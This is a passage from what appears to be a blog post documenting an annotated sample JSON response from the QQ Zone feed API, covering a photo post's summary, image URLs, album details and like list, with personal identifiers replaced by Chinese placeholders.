 "isHighStarVip": 0</span><br><span class="line">                        &#125;,</span><br><span class="line">                        "stuCombineDiamondInfo": &#123;</span><br><span class="line">                            "iShowType": 0,</span><br><span class="line">                            "iVipLevel": 0,</span><br><span class="line">                            "isAnnualVip": 0,</span><br><span class="line">                            "isAnnualVipEver": 0</span><br><span class="line">                        &#125;,</span><br><span class="line">                        "isSafeModeUser": 0,</span><br><span class="line">                        "vipShowType": 1,</span><br><span class="line">                        "namePlate": 0,</span><br><span class="line">                        "actiontype": 0,</span><br><span class="line">                        "actionurl": "",</span><br><span class="line">                        "decoration": &#123;</span><br><span class="line">                            "type": "Buffer",</span><br><span class="line">                            "data": []</span><br><span class="line">                        &#125;,</span><br><span class="line">                        "tagInfos": [],</span><br><span class="line">                        "strPortraitId": "",</span><br><span class="line">                        "under_nickname_desc": "",</span><br><span class="line">                        "liveshowMedalInfo": &#123;</span><br><span class="line">                            "medal_type": 0,</span><br><span class="line">                            "medal_state": 0,</span><br><span class="line">                            "level": 0,</span><br><span class="line">                            "pic_url": "",</span><br><span class="line">                            "jump_url": ""</span><br><span class="line">                        &#125;,</span><br><span class="line">                        "uFansCount": 0,</span><br><span class="line">                        "uVisitorCount": 0,</span><br><span class="line">                        "isCmtVerifyOpen": 0,</span><br><span class="line">                        "iCurUserType": 0,</span><br><span class="line">                        "displayflag": 0,</span><br><span class="line">                        "vtime": 0,</span><br><span class="line">                        "authqzoneMedalInfo": &#123;</span><br><span class="line">                            "medal_type": 0,</span><br><span class="line">                            "medal_state": 0,</span><br><span class="line">                            "level": 0,</span><br><span class="line">                            "pic_url": "",</span><br><span class="line">                            "jump_url": ""</span><br><span class="line">                        &#125;,</span><br><span class="line">                        "eUserTypeReport": 0,</span><br><span class="line">                        "iVipActType": 0,</span><br><span class="line">                        "openid_users": &#123;</span><br><span class="line">                            "openid": "",</span><br><span class="line">                            "nickname": "",</span><br><span class="line">                            "logo": ""</span><br><span class="line">                        &#125;,</span><br><span class="line">                        "sex": 0</span><br><span class="line">                    &#125;,</span><br><span class="line">                    "action_desc": "",</span><br><span class="line">                    "actiontype": 5,</span><br><span class="line">                    "luckyMoneyPics": []</span><br><span class="line">                &#125;,</span><br><span class="line">                "id": &#123;</span><br><span class="line">                    "cellid": "8fa9d120c66ab55e0ac40000",</span><br><span class="line">                    "subid": ""</span><br><span class="line">                &#125;,</span><br><span class="line">                "summary": &#123;// 动态内容</span><br><span class="line">                    "summary": "看看不同的风景，接触不同的人和事，你会发现，自己的烦恼原来是那么微不足道，自己的经历原来那么浅薄。学会给自己现实，不沉溺幻想，不庸人自扰，好好生活，做一个接近幸福的人。 ​​​​  ​",</span><br><span class="line">                    "hasmore": 0,</span><br><span class="line">                    "actiontype": 0,</span><br><span class="line">                    "summarypic": [],</span><br><span class="line">                    "more_info": "",</span><br><span class="line">                    "sparkleword": &#123;</span><br><span class="line">                        "sparkle_color": [],</span><br><span class="line">                        "span_time": 0,</span><br><span class="line">                        "extend_info": &#123;&#125;,</span><br><span class="line">                        "sparkle_id": "",</span><br><span class="line">                        "sparkle_json": ""</span><br><span class="line">                    &#125;,</span><br><span class="line">                    "mapExt": &#123;&#125;,</span><br><span class="line">                    "mapProtoExt": &#123;&#125;,</span><br><span class="line">                    "actionurl": ""</span><br><span class="line">                &#125;,</span><br><span class="line">                "pic": &#123;</span><br><span class="line">                    "picdata": [</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="attr">"picname"</span>: <span class="string">""</span>,</span><br><span class="line">                            <span class="attr">"sloc"</span>: <span class="string">""</span>,</span><br><span class="line">                            <span class="attr">"lloc"</span>: <span class="string">"NRMAVjR0ajZuUklNSnF0VjdhSkRFSQcAcGhvdG90ag!!"</span>,</span><br><span class="line">                            <span class="attr">"photourl"</span>: &#123;</span><br><span class="line">                                <span class="attr">"0"</span>: &#123;</span><br><span class="line">                                    <span class="attr">"url"</span>: <span class="string">"http://r.photo.store.qq.com/psc?/相册ID/B3aOzBA7A9cZiRf*pONrNDPZhbn9qItN4ws93WhRQIyAqzJlO6CI7tFIiE.uj94KuNJHuQOknFNjMLb112qXSA!!/o&amp;ek=1&amp;kp=1&amp;pt=0&amp;bo=VQhABlUIQAYRECc!&amp;tl=1&amp;su=075897570&amp;vuin=QQ号码&amp;tm=1589274000#sce=5-0-0&amp;rf=v1_ht5_qz_3.4.0_001_idc_b-0-0"</span>,</span><br><span class="line">                                    <span class="attr">"width"</span>: <span class="number">2133</span>,</span><br><span class="line">                                    <span class="attr">"height"</span>: <span class="number">1600</span>,</span><br><span class="line">                                    <span class="attr">"focus_x"</span>: <span class="number">1066</span>,</span><br><span class="line">                                    <span class="attr">"focus_y"</span>: <span class="number">800</span>,</span><br><span class="line">                                    <span class="attr">"enlarge_rate"</span>: <span class="number">200</span>,</span><br><span class="line">                                    <span class="attr">"size"</span>: <span class="number">0</span>,</span><br><span class="line">                                    <span class="attr">"md5"</span>: <span class="string">""</span></span><br><span class="line">                                &#125;,</span><br><span class="line">                                <span class="attr">"1"</span>: &#123;</span><br><span class="line">                                    <span class="attr">"url"</span>: <span class="string">"http://m.qpic.cn/psc?/相册ID/B3aOzBA7A9cZiRf*pONrNDPZhbn9qItN4ws93WhRQIyAqzJlO6CI7tFIiE.uj94KuNJHuQOknFNjMLb112qXSA!!/b&amp;ek=1&amp;kp=1&amp;pt=0&amp;bo=VQhABlUIQAYRECc!&amp;tl=1&amp;su=075897570&amp;vuin=QQ号码&amp;tm=1589274000#sce=5-1-1&amp;rf=v1_ht5_qz_3.4.0_001_idc_b-0-0"</span>,</span><br><span class="line">                                    <span class="attr">"width"</span>: <span class="number">2133</span>,</span><br><span class="line">                                    <span class="attr">"height"</span>: <span class="number">1600</span>,</span><br><span class="line">                                    <span class="attr">"focus_x"</span>: <span class="number">1066</span>,</span><br><span class="line">                                    <span class="attr">"focus_y"</span>: <span class="number">800</span>,</span><br><span class="line">                                    <span class="attr">"enlarge_rate"</span>: <span class="number">200</span>,</span><br><span class="line">                                    <span class="attr">"size"</span>: <span class="number">0</span>,</span><br><span class="line">                                    <span class="attr">"md5"</span>: <span class="string">""</span></span><br><span class="line">                                &#125;,</span><br><span class="line">                                <span class="attr">"11"</span>: &#123;</span><br><span class="line">                                    <span class="attr">"url"</span>: <span class="string">"http://m.qpic.cn/psc?/相册ID/B3aOzBA7A9cZiRf*pONrNDPZhbn9qItN4ws93WhRQIyAqzJlO6CI7tFIiE.uj94KuNJHuQOknFNjMLb112qXSA!!/c&amp;ek=1&amp;kp=1&amp;pt=0&amp;bo=VQhABlUIQAYRECc!&amp;tl=1&amp;su=075897570&amp;vuin=QQ号码&amp;tm=1589274000#sce=5-11-2&amp;rf=v1_ht5_qz_3.4.0_001_idc_b-0-0"</span>,</span><br><span class="line">                                    <span class="attr">"width"</span>: <span class="number">512</span>,</span><br><span class="line">                                    <span class="attr">"height"</span>: <span class="number">384</span>,</span><br><span class="line">                                    <span class="attr">"focus_x"</span>: <span class="number">256</span>,</span><br><span class="line">                                    <span class="attr">"focus_y"</span>: <span class="number">192</span>,</span><br><span class="line">                                    <span class="attr">"enlarge_rate"</span>: <span class="number">200</span>,</span><br><span class="line">                                    <span class="attr">"size"</span>: <span class="number">0</span>,</span><br><span class="line">                                    <span class="attr">"md5"</span>: <span class="string">""</span></span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;,</span><br><span class="line">                            <span class="attr">"type"</span>: <span class="number">17</span>,</span><br><span class="line">                            <span class="attr">"ismylike"</span>: <span class="literal">false</span>,</span><br><span class="line">                            <span class="attr">"likecount"</span>: <span class="number">0</span>,</span><br><span class="line">                            <span class="attr">"commentcount"</span>: <span class="number">0</span>,</span><br><span class="line">                            <span class="attr">"busi_param"</span>: &#123;</span><br><span class="line">                                <span class="attr">"6"</span>: <span class="string">"http://user.qzone.qq.com/评论好友QQ/photo/相册ID/NRMAVjR0ajZuUklNSnF0VjdhSkRFSQcAcGhvdG90ag!!"</span>,</span><br><span class="line">                                <span class="attr">"30"</span>: <span class="string">"1"</span>,</span><br><span class="line">                                <span class="attr">"35"</span>: <span class="string">""</span>,</span><br><span class="line">                                <span class="attr">"144"</span>: <span class="string">"http://user.qzone.qq.com/评论好友QQ/photo/相册ID/NRMAVjR0ajZuUklNSnF0VjdhSkRFSQcAcGhvdG90ag!!_quan"</span>,</span><br><span class="line">                                <span class="attr">"-1"</span>: <span class="string">"http://phototj.photo.store.qq.com/psc?/相册ID/B3aOzBA7A9cZiRf*pONrNDPZhbn9qItN4ws93WhRQIyAqzJlO6CI7tFIiE.uj94KuNJHuQOknFNjMLb112qXSA!!/b&amp;bo=VQhABlUIQAYRECc!"</span></span><br><span class="line">                            &#125;,</span><br><span class="line">                            <span class="attr">"clientkey"</span>: <span class="string">""</span>,</span><br><span class="line">                            <span class="attr">"isIndependentUgc"</span>: <span class="number">0</span>,</span><br><span class="line">                            <span class="attr">"opsynflag"</span>: <span class="number">128</span>,</span><br><span class="line">                            <span class="attr">"uUploadTime"</span>: <span class="number">0</span>,</span><br><span class="line">                            <span class="attr">"modifytime"</span>: <span class="number">0</span>,</span><br><span class="line">                            <span class="attr">"desc"</span>: <span class="string">"看看不同的风景，接触不同的人和事，你会发现，自己的烦恼原来是那么微不足道，自己的经历原来那么浅薄。学会给自己现实，不沉溺幻想，不庸人自扰，好好生活，做一个接近幸福的人。 ​​​​  ​"</span>,</span><br><span class="line">                            <span class="attr">"orglikekey"</span>: <span class="string">""</span>,</span><br><span class="line">                            <span class="attr">"curlikekey"</span>: <span class="string">""</span>,</span><br><span class="line">                            <span class="attr">"cropinfo"</span>: &#123;</span><br><span class="line">                                <span class="attr">"centerx_scale"</span>: <span class="number">50</span>,</span><br><span class="line">                                <span class="attr">"centery_scale"</span>: <span class="number">50</span></span><br><span class="line">                            &#125;,</span><br><span class="line">                            <span class="attr">"uploadUin"</span>: <span class="number">0</span>,</span><br><span class="line">                            <span class="attr">"shoottime"</span>: <span class="number">0</span>,</span><br><span class="line">                            <span class="attr">"flag"</span>: <span class="number">0</span>,</span><br><span class="line">                            <span class="attr">"poi"</span>: &#123;</span><br><span class="line">                                <span class="attr">"poi_id"</span>: <span class="string">""</span>,</span><br><span class="line">                                <span class="attr">"poi_x"</span>: <span class="string">""</span>,</span><br><span class="line">                                <span class="attr">"poi_y"</span>: <span class="string">""</span>,</span><br><span class="line">                                <span class="attr">"poi_name"</span>: <span class="string">""</span>,</span><br><span class="line">                                <span class="attr">"poi_address"</span>: <span class="string">""</span>,</span><br><span class="line">                                <span class="attr">"poi_type"</span>: <span class="number">0</span>,</span><br><span class="line">                                <span class="attr">"region_name"</span>: <span class="string">""</span></span><br><span class="line">                            &#125;,</span><br><span class="line">                            <span class="attr">"facelist"</span>: [],</span><br><span class="line">                            <span class="attr">"raw"</span>: <span class="number">0</span>,</span><br><span class="line">                            <span class="attr">"isAutoPlayGif"</span>: <span class="literal">false</span>,</span><br><span class="line">                            <span class="attr">"photoTag"</span>: [],</span><br><span class="line">                            <span class="attr">"opmask"</span>: <span class="number">3</span>,</span><br><span class="line">                            <span class="attr">"albumid"</span>: <span class="string">"相册ID"</span>,</span><br><span class="line">                            <span class="attr">"piccategory"</span>: <span class="number">0</span>,</span><br><span class="line">                            <span class="attr">"videoflag"</span>: <span class="number">0</span>,</span><br><span class="line">                            <span class="attr">"videodata"</span>: &#123;</span><br><span class="line">                                <span class="attr">"videoid"</span>: <span class="string">""</span>,</span><br><span class="line">                                <span class="attr">"videourl"</span>: <span class="string">""</span>,</span><br><span class="line">                                <span class="attr">"coverurl"</span>: &#123;&#125;,</span><br><span class="line">                                <span class="attr">"actiontype"</span>: <span class="number">0</span>,</span><br><span class="line">                                <span class="attr">"actionurl"</span>: <span class="string">""</span>,</span><br><span class="line">                                <span class="attr">"clientkey"</span>: <span class="string">""</span>,</span><br><span class="line">                                <span class="attr">"filetype"</span>: <span class="number">0</span>,</span><br><span class="line">                                <span class="attr">"videotype"</span>: <span class="number">0</span>,</span><br><span class="line">                                <span class="attr">"videotime"</span>: <span class="number">0</span>,</span><br><span class="line">                                <span class="attr">"videourls"</span>: &#123;&#125;,</span><br><span class="line">                                <span class="attr">"playtype"</span>: <span class="number">0</span>,</span><br><span class="line">                                <span class="attr">"videostatus"</span>: <span class="number">0</span>,</span><br><span class="line">                                <span class="attr">"toast"</span>: <span class="string">""</span>,</span><br><span class="line">                                <span class="attr">"extendinfo"</span>: &#123;&#125;,</span><br><span class="line">                                <span class="attr">"videoremark"</span>: &#123;</span><br><span class="line">                                    <span class="attr">"iconurl"</span>: <span class="string">""</span>,</span><br><span class="line">                                    <span class="attr">"icondesc"</span>: <span class="string">""</span>,</span><br><span class="line">                                    <span class="attr">"remark"</span>: <span class="string">""</span>,</span><br><span class="line">                                    <span class="attr">"actiontype"</span>: <span class="number">0</span>,</span><br><span class="line">                                    <span class="attr">"actionurl"</span>: <span class="string">""</span>,</span><br><span class="line">                                    <span class="attr">"orgwebsite"</span>: <span class="number">0</span></span><br><span class="line">                                &#125;,</span><br><span class="line">                                <span class="attr">"video_show_type"</span>: <span class="number">0</span>,</span><br><span class="line">                                <span class="attr">"isPanorama"</span>: <span class="literal">false</span>,</span><br><span class="line">                                <span class="attr">"video_source"</span>: <span class="number">1</span>,</span><br><span class="line">                                <span class="attr">"sloc"</span>: <span class="string">""</span>,</span><br><span class="line">                                <span class="attr">"lloc"</span>: <span class="string">""</span>,</span><br><span class="line">                                <span class="attr">"report_video_feeds_type"</span>: <span class="number">0</span>,</span><br><span class="line">                                <span class="attr">"videoplaycnt"</span>: <span class="number">0</span>,</span><br><span class="line">                                <span class="attr">"is_share"</span>: <span class="literal">false</span>,</span><br><span class="line">                                <span class="attr">"adv_delay_time"</span>: <span class="number">0</span>,</span><br><span class="line">                                <span class="attr">"video_webview_url"</span>: <span class="string">""</span>,</span><br><span class="line">                                <span class="attr">"isOnWifiPlay"</span>: <span class="literal">false</span>,</span><br><span class="line">                                <span class="attr">"isHadSetPlayOnWifi"</span>: <span class="literal">false</span>,</span><br><span class="line">                                <span class="attr">"auto_refresh_second"</span>: <span class="number">0</span>,</span><br><span class="line">                                <span class="attr">"vcCovers"</span>: [],</span><br><span class="line">                                <span class="attr">"video_form"</span>: <span class="number">0</span>,</span><br><span class="line">                                <span class="attr">"gaussPicUrl"</span>: &#123;&#125;,</span><br><span class="line">                                <span class="attr">"weishi"</span>: &#123;</span><br><span class="line">                                    <span class="attr">"weishi_feedId"</span>: <span class="string">""</span>,</span><br><span class="line">                                    <span class="attr">"weishi_fileId"</span>: <span class="string">""</span>,</span><br><span class="line">                                    <span class="attr">"cover_url"</span>: <span class="string">""</span>,</span><br><span class="line">                                    <span class="attr">"nick_name"</span>: <span class="string">""</span>,</span><br><span class="line">                                    <span class="attr">"weishi_musicId"</span>: <span class="string">""</span>,</span><br><span class="line">                                    <span class="attr">"weishi_musicName"</span>: <span class="string">""</span>,</span><br><span class="line">                                    <span class="attr">"weishi_musicUrl"</span>: <span class="string">""</span>,</span><br><span class="line">                                    <span class="attr">"weishi_topicID"</span>: <span class="string">""</span>,</span><br><span class="line">                                    <span class="attr">"weishi_topicName"</span>: <span class="string">""</span>,</span><br><span class="line">                                    <span class="attr">"weishi_topicUrl"</span>: <span class="string">""</span>,</span><br><span class="line">                                    <span class="attr">"weishi_schema"</span>: <span class="string">""</span>,</span><br><span class="line">                                    <span class="attr">"dc_report"</span>: &#123;&#125;</span><br><span class="line">                                &#125;,</span><br><span class="line">                                <span class="attr">"stKingCard"</span>: &#123;</span><br><span class="line">                                    <span class="attr">"is_guide"</span>: <span class="literal">false</span>,</span><br><span class="line">                                    <span class="attr">"button_title"</span>: <span class="string">""</span>,</span><br><span class="line">                                    <span class="attr">"jump_url"</span>: <span class="string">""</span></span><br><span class="line">                                &#125;,</span><br><span class="line">                                <span class="attr">"bottom_button"</span>: &#123;</span><br><span class="line">                                    <span class="attr">"text"</span>: <span class="string">""</span>,</span><br><span class="line">                                    <span class="attr">"actiontype"</span>: <span class="number">0</span>,</span><br><span class="line">                                    <span class="attr">"actionurl"</span>: <span class="string">""</span>,</span><br><span class="line">                                    <span class="attr">"button_img"</span>: <span class="string">""</span>,</span><br><span class="line">                                    <span class="attr">"button_background_img"</span>: <span class="string">""</span>,</span><br><span class="line">                                    <span class="attr">"button_icon"</span>: <span class="string">""</span>,</span><br><span class="line">                                    <span class="attr">"stMapABTest"</span>: &#123;&#125;,</span><br><span class="line">                                    <span class="attr">"appear_time"</span>: <span class="number">0</span>,</span><br><span class="line">                                    <span class="attr">"duration_time"</span>: <span class="number">0</span></span><br><span class="line">                                &#125;,</span><br><span class="line">                                <span class="attr">"video_click_type"</span>: <span class="number">0</span>,</span><br><span class="line">                                <span class="attr">"header_desc"</span>: <span class="string">""</span>,</span><br><span class="line">                                <span class="attr">"video_rate_list"</span>: [],</span><br><span class="line">                                <span class="attr">"cur_video_rate"</span>: <span class="number">0</span></span><br><span class="line">                            &#125;,</span><br><span class="line">                            <span class="attr">"isCoverPic"</span>: <span class="literal">false</span>,</span><br><span class="line">                            <span class="attr">"pic_host_nick"</span>: &#123;</span><br><span class="line">                                <span class="attr">"uin"</span>: <span class="number">0</span>,</span><br><span class="line">                                <span class="attr">"nick"</span>: <span class="string">""</span></span><br><span class="line">                            &#125;,</span><br><span class="line">                            <span class="attr">"luckyMoneyDesc"</span>: <span class="string">""</span>,</span><br><span class="line">                            <span class="attr">"geo"</span>: &#123;</span><br><span class="line">                                <span class="attr">"poi_id"</span>: <span class="string">""</span>,</span><br><span class="line">                                <span class="attr">"poi_x"</span>: <span class="string">""</span>,</span><br><span class="line">                                <span class="attr">"poi_y"</span>: <span class="string">""</span>,</span><br><span class="line">                                <span class="attr">"poi_name"</span>: <span class="string">""</span>,</span><br><span class="line">                                <span class="attr">"poi_address"</span>: <span class="string">""</span>,</span><br><span class="line">                                <span class="attr">"poi_type"</span>: <span class="number">0</span>,</span><br><span class="line">                                <span class="attr">"region_name"</span>: <span class="string">""</span></span><br><span class="line">                            &#125;,</span><br><span class="line">                            <span class="attr">"operation"</span>: &#123;</span><br><span class="line">                                <span class="attr">"busi_param"</span>: &#123;&#125;,</span><br><span class="line">                                <span class="attr">"weixin_url"</span>: <span class="string">""</span>,</span><br><span class="line">                                <span class="attr">"qq_url"</span>: <span class="string">""</span>,</span><br><span class="line">                                <span class="attr">"share_info"</span>: &#123;</span><br><span class="line">                                    <span class="attr">"title"</span>: <span class="string">""</span>,</span><br><span class="line">                                    <span class="attr">"summary"</span>: <span class="string">""</span>,</span><br><span class="line">                                    <span class="attr">"photourl"</span>: &#123;&#125;,</span><br><span class="line">                                    <span class="attr">"ark_sharedata"</span>: &#123;</span><br><span class="line">                                        <span class="attr">"ark_id"</span>: <span class="string">""</span>,</span><br><span class="line">                                        <span class="attr">"view_id"</span>: <span class="string">""</span>,</span><br><span class="line">                                        <span class="attr">"ark_content"</span>: <span class="string">""</span></span><br><span class="line">                                    &#125;,</span><br><span class="line">                                    <span class="attr">"action_url"</span>: <span class="string">""</span></span><br><span class="line">                                &#125;,</span><br><span class="line">                                <span class="attr">"schema_info"</span>: &#123;</span><br><span class="line">                                    <span class="attr">"actiontype"</span>: <span class="number">0</span>,</span><br><span class="line">                                    <span class="attr">"actionurl"</span>: <span class="string">""</span>,</span><br><span class="line">                                    <span class="attr">"downloadurl"</span>: <span class="string">""</span>,</span><br><span class="line">                                    <span class="attr">"appid"</span>: <span class="string">""</span>,</span><br><span class="line">                                    <span class="attr">"postparams"</span>: <span class="string">""</span>,</span><br><span class="line">                                    <span class="attr">"usepost"</span>: <span class="number">0</span>,</span><br><span class="line">                                    <span class="attr">"schemapageurl"</span>: <span class="string">""</span>,</span><br><span class="line">                                    <span class="attr">"appname"</span>: <span class="string">""</span>,</span><br><span class="line">                                    <span class="attr">"loadingpage"</span>: <span class="literal">false</span>,</span><br><span class="line">                                    <span class="attr">"yingyongbao"</span>: <span class="literal">true</span>,</span><br><span class="line">                                    <span class="attr">"master_actionurl"</span>: <span class="string">""</span></span><br><span class="line">                                &#125;,</span><br><span class="line">                                <span class="attr">"recomm_cookie"</span>: &#123;&#125;,</span><br><span class="line">                                <span class="attr">"click_stream_report"</span>: &#123;&#125;,</span><br><span class="line">                                <span class="attr">"qboss_trace"</span>: <span class="string">""</span>,</span><br><span class="line">                                <span class="attr">"custom_btn"</span>: [],</span><br><span class="line">                                <span class="attr">"feed_report_cookie"</span>: &#123;&#125;,</span><br><span class="line">                                <span class="attr">"generic_url"</span>: <span class="string">""</span>,</span><br><span class="line">                                <span class="attr">"bypass_param"</span>: &#123;&#125;,</span><br><span class="line">                                <span class="attr">"droplist_cookie"</span>: &#123;&#125;,</span><br><span class="line">                                <span class="attr">"rank_param"</span>: &#123;&#125;,</span><br><span class="line">                                <span class="attr">"button_gif_url"</span>: <span class="string">""</span>,</span><br><span class="line">                                <span class="attr">"offline_resource_bid"</span>: <span class="number">0</span></span><br><span class="line">                            &#125;,</span><br><span class="line">                            <span class="attr">"musicdata"</span>: &#123;</span><br><span class="line">                                <span class="attr">"musicid"</span>: <span class="string">""</span>,</span><br><span class="line">                                <span class="attr">"musicurl"</span>: <span class="string">""</span>,</span><br><span class="line">                                <span class="attr">"coverurl"</span>: <span class="string">""</span>,</span><br><span class="line">                                <span class="attr">"width"</span>: <span class="number">0</span>,</span><br><span class="line">                                <span class="attr">"height"</span>: <span class="number">0</span>,</span><br><span class="line">                                <span class="attr">"title"</span>: <span class="string">""</span>,</span><br><span class="line">                                <span class="attr">"musictime"</span>: <span class="number">0</span>,</span><br><span class="line">                                <span class="attr">"musicMId"</span>: <span class="string">""</span>,</span><br><span class="line">                                <span class="attr">"musicType"</span>: <span class="string">""</span>,</span><br><span class="line">                                <span class="attr">"musicMUrl"</span>: <span class="string">""</span></span><br><span class="line">                            &#125;,</span><br><span class="line">                            <span class="attr">"audio_summary"</span>: <span class="string">""</span>,</span><br><span class="line">                            <span class="attr">"batchid"</span>: <span class="number">0</span>,</span><br><span class="line">                            <span class="attr">"quankey"</span>: <span class="string">"http://user.qzone.qq.com/评论好友QQ/photo/相册ID/NRMAVjR0ajZuUklNSnF0VjdhSkRFSQcAcGhvdG90ag!!_quan"</span>,</span><br><span class="line">                            <span class="attr">"origin_size"</span>: <span class="number">0</span>,</span><br><span class="line">                            <span class="attr">"origin_width"</span>: <span class="number">2133</span>,</span><br><span class="line">                            <span class="attr">"origin_height"</span>: <span class="number">1600</span>,</span><br><span class="line">                            <span class="attr">"origin_phototype"</span>: <span class="number">0</span>,</span><br><span class="line">                            <span class="attr">"binaryExtInfo"</span>: &#123;&#125;,</span><br><span class="line">                            <span class="attr">"vecShowDryingTagInfo"</span>: [],</span><br><span class="line">                            <span class="attr">"fashion_tag_key"</span>: <span class="string">""</span></span><br><span class="line">                        &#125;</span><br><span class="line">                    ],</span><br><span class="line">                    "albumname": "",</span><br><span class="line">                    "albumid": "相册ID", // 图片存储的相册ID</span><br><span class="line">                    "albumnum": 0,</span><br><span class="line">                    "uploadnum": 1,</span><br><span class="line">                    "albumrights": 0,</span><br><span class="line">                    "albumquestion": "",</span><br><span class="line">                    "albumanswer": "",</span><br><span class="line">                    "desc": "",</span><br><span class="line">                    "uin": 评论好友QQ,</span><br><span class="line">                    "balbum": false,</span><br><span class="line">                    "lastupdatetime": 0,</span><br><span class="line">                    "busi_param": &#123;&#125;,</span><br><span class="line">                    "qunid": "",</span><br><span class="line">                    "allow_access": 0,</span><br><span class="line">                    "anonymity": 0,</span><br><span class="line">                    "albumtype": 0,</span><br><span class="line">                    "actiontype": 18,</span><br><span class="line">                    "actionurl": "",</span><br><span class="line">                    "isSubscribe": true,</span><br><span class="line">                    "friendinfo": &#123;</span><br><span class="line">                        "uin": 0,</span><br><span class="line">                        "nickname": "",</span><br><span class="line">                        "timestamp": 0,</span><br><span class="line">                        "from": 1,</span><br><span class="line">                        "uinkey": "",</span><br><span class="line">                        "logo": "",</span><br><span class="line">                        "vip": 0,</span><br><span class="line">                        "level": 0,</span><br><span class="line">                        "viplevel": 0,</span><br><span class="line">                        "viptype": 0,</span><br><span class="line">                        "qzonedesc": "",</span><br><span class="line">                        "is_owner": 0,</span><br><span class="line">                        "operation_mask": 0,</span><br><span class="line">                        "uid": "",</span><br><span class="line">                        "talk_id": "",</span><br><span class="line">                        "portrait_id": 0,</span><br><span class="line">                        "is_own": 0,</span><br><span class="line">                        "isFamousWhite": 0,</span><br><span class="line">                        "isQzoneUser": 0,</span><br><span class="line">                        "isAnnualVip": 0,</span><br><span class="line">                        "isSetNickGlint": 0,</span><br><span class="line">                        "medalInfo": &#123;</span><br><span class="line">                            "medal_type": 0,</span><br><span class="line">                            "medal_state": 0,</span><br><span class="line">                            "level": 0,</span><br><span class="line">                            "pic_url": "",</span><br><span class="line">                            "jump_url": ""</span><br><span class="line">                        &#125;,</span><br><span class="line">                        "descicon": "",</span><br><span class="line">                        "icon_width": 0,</span><br><span class="line">                        "icon_height": 0,</span><br><span class="line">                        "isSweetVip": 0,</span><br><span class="line">                        "stuStarInfo": &#123;</span><br><span class="line">                            "iStarStatus": 0,</span><br><span class="line">                            "iStarLevel": 0,</span><br><span class="line">                            "isAnnualVip": 0,</span><br><span class="line">                            "isHighStarVip": 0</span><br><span class="line">                        &#125;,</span><br><span class="line">                        "stuCombineDiamondInfo": &#123;</span><br><span class="line">                            "iShowType": 0,</span><br><span class="line">                            "iVipLevel": 0,</span><br><span class="line">                            "isAnnualVip": 0,</span><br><span class="line">                            "isAnnualVipEver": 0</span><br><span class="line">                        &#125;,</span><br><span class="line">                        "isSafeModeUser": 0,</span><br><span class="line">                        "vipShowType": -1,</span><br><span class="line">                        "namePlate": 0,</span><br><span class="line">                        "actiontype": 0,</span><br><span class="line">                        "actionurl": "",</span><br><span class="line">                        "decoration": &#123;</span><br><span class="line">                            "type": "Buffer",</span><br><span class="line">                            "data": []</span><br><span class="line">                        &#125;,</span><br><span class="line">                        "tagInfos": [],</span><br><span class="line">                        "strPortraitId": "",</span><br><span class="line">                        "under_nickname_desc": "",</span><br><span class="line">                        "liveshowMedalInfo": &#123;</span><br><span class="line">                            "medal_type": 0,</span><br><span class="line">                            "medal_state": 0,</span><br><span class="line">                            "level": 0,</span><br><span class="line">                            "pic_url": "",</span><br><span class="line">                            "jump_url": ""</span><br><span class="line">                        &#125;,</span><br><span class="line">                        "uFansCount": 0,</span><br><span class="line">                        "uVisitorCount": 0,</span><br><span class="line">                        "isCmtVerifyOpen": 0,</span><br><span class="line">                        "iCurUserType": 0,</span><br><span class="line">                        "displayflag": 0,</span><br><span class="line">                        "vtime": 0,</span><br><span class="line">                        "authqzoneMedalInfo": &#123;</span><br><span class="line">                            "medal_type": 0,</span><br><span class="line">                            "medal_state": 0,</span><br><span class="line">                            "level": 0,</span><br><span class="line">                            "pic_url": "",</span><br><span class="line">                            "jump_url": ""</span><br><span class="line">                        &#125;,</span><br><span class="line">                        "eUserTypeReport": 0,</span><br><span class="line">                        "iVipActType": 0,</span><br><span class="line">                        "openid_users": &#123;</span><br><span class="line">                            "openid": "",</span><br><span class="line">                            "nickname": "",</span><br><span class="line">                            "logo": ""</span><br><span class="line">                        &#125;,</span><br><span class="line">                        "sex": 0</span><br><span class="line">                    &#125;,</span><br><span class="line">                    "news": "",</span><br><span class="line">                    "unread_count": 0,</span><br><span class="line">                    "facemans": [],</span><br><span class="line">                    "faceman_num": 0,</span><br><span class="line">                    "store_appid": "",</span><br><span class="line">                    "extend_actiontype": 0,</span><br><span class="line">                    "extend_actionurl": "",</span><br><span class="line">                    "albshowmask": 0,</span><br><span class="line">                    "allow_share": 0,</span><br><span class="line">                    "individualalbum": 0,</span><br><span class="line">                    "activealbum": 0,</span><br><span class="line">                    "newestupload": 0,</span><br><span class="line">                    "is_share": false,</span><br><span class="line">                    "is_video_pic_mix": false,</span><br><span class="line">                    "is_contain_video_and_pic": false,</span><br><span class="line">                    "is_share_owner": true,</span><br><span class="line">                    "animation_type": 0,</span><br><span class="line">                    "sort_type": 0,</span><br><span class="line">                    "is_topped_album": false</span><br><span class="line">                &#125;,</span><br><span class="line">                "like": &#123; // 点赞列表</span><br><span class="line">                    "num": 25,</span><br><span class="line">                    "isliked": 0,</span><br><span class="line">                    "likemans": [</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="attr">"user"</span>: &#123;</span><br><span class="line">                                <span class="attr">"uin"</span>: 点赞好友QQ,</span><br><span class="line">                                <span class="attr">"nickname"</span>: <span class="string">"点赞好友昵称"</span>,</span><br><span class="line">                                <span class="attr">"timestamp"</span>: <span class="number">0</span>,</span><br><span class="line">                                <span class="attr">"from"</span>: <span class="number">1</span>,</span><br><span class="line">                                <span class="attr">"uinkey"</span>: <span class="string">""</span>,</span><br><span class="line">                                <span class="attr">"logo"</span>: <span class="string">""</span>,</span><br><span class="line">                                <span class="attr">"vip"</span>: <span class="number">0</span>,</span><br><span class="line">                                <span class="attr">"level"</span>: <span class="number">0</span>,</span><br><span class="line">                                <span class="attr">"viplevel"</span>: <span class="number">0</span>,</span><br><span class="line">                                <span class="attr">"viptype"</span>: <span class="number">0</span>,</span><br><span class="line">                                <span class="attr">"qzonedesc"</span>: <span class="string">""</span>,</span><br><span class="line">                                <span class="attr">"is_owner"</span>: <span class="number">0</span>,</span><br><span class="line">                                <span class="attr">"operation_mask"</span>: <span class="number">0</span>,</span><br><span class="line">                                <span class="attr">"uid"</span>: <span class="string">""</span>,</span><br><span class="line">                                <span class="attr">"talk_id"</span>: <span class="string">""</span>,</span><br><span class="line">                                <span class="attr">"portrait_id"</span>: <span class="number">0</span>,</span><br><span class="line">                                <span class="attr">"is_own"</span>: <span 